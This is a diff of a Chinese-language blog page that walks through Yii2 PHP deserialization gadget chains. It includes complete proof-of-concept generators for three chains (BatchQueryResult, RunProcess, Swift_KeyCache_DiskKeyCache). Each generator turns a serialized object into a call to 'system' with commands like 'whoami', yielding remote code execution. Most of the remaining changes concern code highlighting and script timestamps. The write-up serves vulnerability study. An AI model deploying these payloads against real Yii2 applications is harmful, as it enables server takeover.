class="variable">$_dataReader</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+namespace yii\rest&#123;
+    class CreateAction&#123;
+        public $checkAccess;
+        public $id;
 
+        public function __construct()&#123;
+            $this-&gt;checkAccess = &#39;system&#39;;
+            $this-&gt;id = &#39;whoami&#39;;
+        &#125;
+    &#125;
+&#125;
+
+namespace Faker&#123;
+    use yii\rest\CreateAction;
+
+    class Generator&#123;
+        protected $formatters;
+
+        public function __construct()&#123;
+            $this-&gt;formatters[&#39;close&#39;] = [new CreateAction(), &#39;run&#39;];
+        &#125;
+    &#125;
+&#125;
+
+namespace yii\db&#123;
+    use Faker\Generator;
+
+    class BatchQueryResult&#123;
+        private $_dataReader;
+
+        public function __construct()&#123;
+            $this-&gt;_dataReader = new Generator;
+        &#125;
+    &#125;
+&#125;
+namespace&#123;
+    echo base64_encode(serialize(new yii\db\BatchQueryResult));
+&#125;
+?&gt;
+</code></pre>
 <blockquote>
 <p>注意命名空间</p>
 </blockquote>
@@ -2713,39 +2912,178 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <h3 id="第二条链RunProcess"><a href="#第二条链RunProcess" class="headerlink" title="第二条链RunProcess"></a>第二条链RunProcess</h3><p>从github commit记录我们已经知道新版本的<code>BatchQueryResult</code>类已经无法反序列化了，那么我们就需要<strong>通过不同的触发点来绕过新版本的Patch</strong></p>
 <p>找其他的类的方式也很简单，全局搜索<code>__destruct</code>与<code>__wakeup</code>函数，然后一个个排查</p>
 <p><code>Codeception\Extension\RunProcess</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;stopProcess();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stopProcess</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (array_reverse(<span class="keyword">$this</span>-&gt;processes) <span class="keyword">as</span> <span class="variable">$process</span>) &#123;</span><br><span class="line">        <span class="comment">/** <span class="doctag">@var</span> $process Process  **/</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$process</span>-&gt;isRunning()) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;output-&gt;debug(<span class="string">&#x27;[RunProcess] Stopping &#x27;</span> . <span class="variable">$process</span>-&gt;getCommandLine());</span><br><span class="line">        <span class="variable">$process</span>-&gt;stop();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;processes = [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">public function __destruct()
+&#123;
+    $this-&gt;stopProcess();
+&#125;
 
+public function stopProcess()
+&#123;
+    foreach (array_reverse($this-&gt;processes) as $process) &#123;
+        /** @var $process Process  **/
+        if (!$process-&gt;isRunning()) &#123;
+            continue;
+        &#125;
+        $this-&gt;output-&gt;debug(&#39;[RunProcess] Stopping &#39; . $process-&gt;getCommandLine());
+        $process-&gt;stop();
+    &#125;
+    $this-&gt;processes = [];
+&#125;
+</code></pre>
 <p>可以看到<code>$this-&gt;processes</code>可控，那也就意味着<code>$process</code>可控，然后下面又调用了<code>$process-&gt;isRunning</code>,这不又可以接上第一条利用链的<code>__call</code>方法开头的后半段吗？</p>
 <p>利用链：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Codeception\Extension\RunProcess::__destruct()</span><br><span class="line">-&gt;</span><br><span class="line">Faker\Generator::__call()</span><br><span class="line">-&gt;</span><br><span class="line">yii\rest\IndexAction::run()</span><br></pre></td></tr></table></figure>
-
+<pre><code>Codeception\Extension\RunProcess::__destruct()
+-&gt;
+Faker\Generator::__call()
+-&gt;
+yii\rest\IndexAction::run()
+</code></pre>
 <p>poc:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="comment">// 这里需要改为isRunning</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;isRunning&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// poc2</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Codeception</span>\<span class="title">Extension</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">RunProcess</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$processes</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;processes = [<span class="keyword">new</span> <span class="built_in">Generator</span>()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    // 生成<span class="title">poc</span></span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">Codeception</span>\<span class="title">Extension</span>\<span class="title">RunProcess</span>()));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+namespace yii\rest&#123;
+    class CreateAction&#123;
+        public $checkAccess;
+        public $id;
 
+        public function __construct()&#123;
+            $this-&gt;checkAccess = &#39;system&#39;;
+            $this-&gt;id = &#39;ls&#39;;
+        &#125;
+    &#125;
+&#125;
 
+namespace Faker&#123;
+    use yii\rest\CreateAction;
 
-<h3 id="第三条链Swift-KeyCache-DiskKeyCache"><a href="#第三条链Swift-KeyCache-DiskKeyCache" class="headerlink" title="第三条链Swift_KeyCache_DiskKeyCache"></a>第三条链Swift_KeyCache_DiskKeyCache</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;keys <span class="keyword">as</span> <span class="variable">$nsKey</span> =&gt; <span class="variable">$null</span>) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;clearAll(<span class="variable">$nsKey</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+    class Generator&#123;
+        protected $formatters;
 
+        public function __construct()&#123;
+            // 这里需要改为isRunning
+            $this-&gt;formatters[&#39;isRunning&#39;] = [new CreateAction(), &#39;run&#39;];
+        &#125;
+    &#125;
+&#125;
+
+// poc2
+namespace Codeception\Extension&#123;
+    use Faker\Generator;
+    class RunProcess&#123;
+        private $processes;
+        public function __construct()
+        &#123;
+            $this-&gt;processes = [new Generator()];
+        &#125;
+    &#125;
+&#125;
+namespace&#123;
+    // 生成poc
+    echo base64_encode(serialize(new Codeception\Extension\RunProcess()));
+&#125;
+?&gt;
+</code></pre>
+<h3 id="第三条链Swift-KeyCache-DiskKeyCache"><a href="#第三条链Swift-KeyCache-DiskKeyCache" class="headerlink" title="第三条链Swift_KeyCache_DiskKeyCache"></a>第三条链Swift_KeyCache_DiskKeyCache</h3><pre><code class="PHP">public function __destruct()
+&#123;
+    foreach ($this-&gt;keys as $nsKey =&gt; $null) &#123;
+        $this-&gt;clearAll($nsKey);
+    &#125;
+&#125;
+</code></pre>
 <p>跟进clearAll方法：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">clearAll</span>(<span class="params"><span class="variable">$nsKey</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (array_key_exists(<span class="variable">$nsKey</span>, <span class="keyword">$this</span>-&gt;keys)) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;keys[<span class="variable">$nsKey</span>] <span class="keyword">as</span> <span class="variable">$itemKey</span> =&gt; <span class="variable">$null</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;clearKey(<span class="variable">$nsKey</span>, <span class="variable">$itemKey</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ....</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+<pre><code class="PHP">public function clearAll($nsKey)
+&#123;
+    if (array_key_exists($nsKey, $this-&gt;keys)) &#123;
+        foreach ($this-&gt;keys[$nsKey] as $itemKey =&gt; $null) &#123;
+            $this-&gt;clearKey($nsKey, $itemKey);
+        &#125;
+        ....
+    &#125;
+&#125;
+</code></pre>
 <p>这里的<code>$this-&gt;keys</code>以及<code>$nsKey、$itemKey</code>啥的都是我们可控的，所以是可以执行到<code>$this-&gt;clearKey</code>的，跟进去：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">clearKey</span>(<span class="params"><span class="variable">$nsKey</span>, <span class="variable">$itemKey</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;hasKey(<span class="variable">$nsKey</span>, <span class="variable">$itemKey</span>)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;freeHandle(<span class="variable">$nsKey</span>, <span class="variable">$itemKey</span>);</span><br><span class="line">        unlink(<span class="keyword">$this</span>-&gt;path.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$nsKey</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$itemKey</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+<pre><code class="PHP">public function clearKey($nsKey, $itemKey)
+&#123;
+    if ($this-&gt;hasKey($nsKey, $itemKey)) &#123;
+        $this-&gt;freeHandle($nsKey, $itemKey);
+        unlink($this-&gt;path.&#39;/&#39;.$nsKey.&#39;/&#39;.$itemKey);
+    &#125;
+&#125;
+</code></pre>
 <p>这里的<code>$this-&gt;path</code>也可控，这就方便了，可以看到这里是进行了一个字符串拼接操作，那么意味着可以利用魔术方法<code>__toString</code>来触发后续操作</p>
 <p>接着全局搜索<code>__toString</code>方法，有很多</p>
 <p>就拿<code>See.php</code>中的<code>__toString</code>举例,代码如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) : <span class="title">string</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;refers . (<span class="keyword">$this</span>-&gt;description ? <span class="string">&#x27; &#x27;</span> . <span class="keyword">$this</span>-&gt;description-&gt;render() : <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+<pre><code class="PHP">public function __toString() : string
+&#123;
+    return $this-&gt;refers . ($this-&gt;description ? &#39; &#39; . $this-&gt;description-&gt;render() : &#39;&#39;);
+&#125;
+</code></pre>
 <p>可以看到<code>$this-&gt;description</code>可控</p>
 <p>利用链：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Swift_KeyCache_DiskKeyCache</span><br><span class="line">-&gt;</span><br><span class="line">phpDocumentor\Reflection\DocBlock\Tags\See::__toString()</span><br><span class="line">-&gt;</span><br><span class="line">Faker\Generator::__call()</span><br><span class="line">-&gt;</span><br><span class="line">yii\rest\IndexAction::run()</span><br></pre></td></tr></table></figure>
-
+<pre><code>Swift_KeyCache_DiskKeyCache
+-&gt;
+phpDocumentor\Reflection\DocBlock\Tags\See::__toString()
+-&gt;
+Faker\Generator::__call()
+-&gt;
+yii\rest\IndexAction::run()
+</code></pre>
 <p>poc:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="comment">// 这里需要改为render</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;render&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">See</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$description</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;description = <span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>\<span class="title">See</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Swift_KeyCache_DiskKeyCache</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$keys</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$path</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;path = <span class="keyword">new</span> See;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;keys = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;axin&quot;</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;is&quot;</span>=&gt;<span class="string">&quot;handsome&quot;</span>)</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 生成poc</span></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Swift_KeyCache_DiskKeyCache()));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+namespace yii\rest&#123;
+    class CreateAction&#123;
+        public $checkAccess;
+        public $id;
 
+        public function __construct()&#123;
+            $this-&gt;checkAccess = &#39;system&#39;;
+            $this-&gt;id = &#39;ls&#39;;
+        &#125;
+    &#125;
+&#125;
 
+namespace Faker&#123;
+    use yii\rest\CreateAction;
 
+    class Generator&#123;
+        protected $formatters;
+
+        public function __construct()&#123;
+            // 这里需要改为render
+            $this-&gt;formatters[&#39;render&#39;] = [new CreateAction(), &#39;run&#39;];
+        &#125;
+    &#125;
+&#125;
+
+namespace phpDocumentor\Reflection\DocBlock\Tags&#123;
+
+    use Faker\Generator;
+
+    class See&#123;
+        protected $description;
+        public function __construct()
+        &#123;
+            $this-&gt;description = new Generator();
+        &#125;
+    &#125;
+&#125;
+namespace&#123;
+    use phpDocumentor\Reflection\DocBlock\Tags\See;
+    class Swift_KeyCache_DiskKeyCache&#123;
+        private $keys = [];
+        private $path;
+        public function __construct()
+        &#123;
+            $this-&gt;path = new See;
+            $this-&gt;keys = array(
+                &quot;axin&quot;=&gt;array(&quot;is&quot;=&gt;&quot;handsome&quot;)
+            );
+        &#125;
+    &#125;
+    // 生成poc
+    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));
+&#125;
+?&gt;
+</code></pre>
 <p>还有很多链，就不再复现了，下一次自己找自己写poc</p>
 <p><a target="_blank" rel="noopener" href="https://v0w.top/2020/09/22/Yii2unserialize/">https://v0w.top/2020/09/22/Yii2unserialize/</a></p>
 <p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/56">https://forum.butian.net/share/56</a></p>
@@ -2757,10 +3095,12 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <li><a target="_blank" rel="noopener" href="https://0xkami.top/2020/10/26/0x08cve-2020-15148-Yii2">https://0xkami.top/2020/10/26/0x08cve-2020-15148-Yii2</a></li>
 </ul>
 <p><strong>正则匹配可控的方法</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-&gt;\$([a-zA-Z0-9_-]+)\(</span><br></pre></td></tr></table></figure>
-
+<pre><code>-&gt;\$([a-zA-Z0-9_-]+)\(
+</code></pre>
 <p><strong>正则匹配可控的传入参数</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[^if ][^foreach ][^while ]\(\$([a-zA-Z0-9_-]+)-&gt;</span><br></pre></td></tr></table></figure>
+<pre><code>[^if ][^foreach ][^while ]\(\$([a-zA-Z0-9_-]+)-&gt;
+</code></pre>
+
 </div>
   
   
@@ -3261,6 +3601,8 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
   
   
+  volantis.css("https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/styles/idea.css");
+  
 </script>
 
 <!-- required -->
@@ -3378,19 +3720,19 @@ volantis.pjax.push(bindToggleButton);
     
       const sites_api = document.getElementById('sites-api');
       if (sites_api != undefined && typeof SitesJS === 'undefined') {
-        volantis.js("/js/plugins/sites.js?time=1635575084461")
+        volantis.js("/js/plugins/sites.js?time=1635577490349")
       }
     
     
       const friends_api = document.getElementById('friends-api');
       if (friends_api != undefined && typeof FriendsJS === 'undefined') {
-        volantis.js("/js/plugins/friends.js?time=1635575084461")
+        volantis.js("/js/plugins/friends.js?time=1635577490349")
       }
     
     
       const contributors_api = document.getElementById('contributors-api');
       if (contributors_api != undefined && typeof ContributorsJS === 'undefined') {
-        volantis.js("/js/plugins/contributors.js?time=1635575084461")
+        volantis.js("/js/plugins/contributors.js?time=1635577490349")
       }
     
   };
@@ -3490,7 +3832,7 @@ volantis.pjax.push(bindToggleButton);
       emojiMaps: emojiMaps,
     }))
   }
-  volantis.js('/js/valine.js?time=1635575084461').then(pjax_valine)
+  volantis.js('/js/valine.js?time=1635577490349').then(pjax_valine)
   volantis.pjax.push(pjax_valine);
 </script>
 
@@ -3499,7 +3841,7 @@ volantis.pjax.push(bindToggleButton);
 
 
 
-<script src="/js/app.js?time=1635575084461.js"></script>
+<script src="/js/app.js?time=1635577490349.js"></script>
 
 
 <!-- optional -->
@@ -3512,7 +3854,7 @@ volantis.pjax.push(bindToggleButton);
 
   function loadSearchScript() {
     // see: layout/_partial/scripts/_ctrl/cdnCtrl.ejs
-    return volantis.js("/js/search/hexo.js?time=1635575084461");
+    return volantis.js("/js/search/hexo.js?time=1635577490349");
   }
 
   function loadSearchService() {
@@ -3550,6 +3892,20 @@ volantis.pjax.push(bindToggleButton);
 
 
 
+
+  
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/highlight.min.js"></script>
+
+<script>volantis.requestAnimationFrame(hljs.initHighlightingOnLoad)</script>
+
+<script>
+volantis.pjax.push(()=>{
+	document.querySelectorAll('pre code').forEach((block) => {
+	  hljs.highlightBlock(block);
+	});
+},"highlightjs")
+</script>
 
 
 
@@ -3780,8 +4136,8 @@ volantis.pjax.push(bindToggleButton);
   <script>
   volantis.message = (title, message, option = {}, done = null) => {
     if (typeof iziToast == "undefined") {
-      volantis.css('/css/message.css?time=1635575084461')
-      volantis.js('/js/message.js?time=1635575084461', () => {
+      volantis.css('/css/message.css?time=1635577490349')
+      volantis.js('/js/message.js?time=1635577490349', () => {
         tozashMessage(title, message, option, done);
       });
     } else {
@@ -3825,8 +4181,8 @@ volantis.pjax.push(bindToggleButton);
 
   volantis.question = (title, message, option = {}, success = null, cancel = null, done = null) => {
     if (typeof iziToast == "undefined") {
-      volantis.css('/css/message.css?time=1635575084461')
-      volantis.js('/js/message.js?time=1635575084461', () => {
+      volantis.css('/css/message.css?time=1635577490349')
+      volantis.js('/js/message.js?time=1635577490349', () => {
         tozashQuestion(title, message, option, success, cancel, done);
       });
     } else {
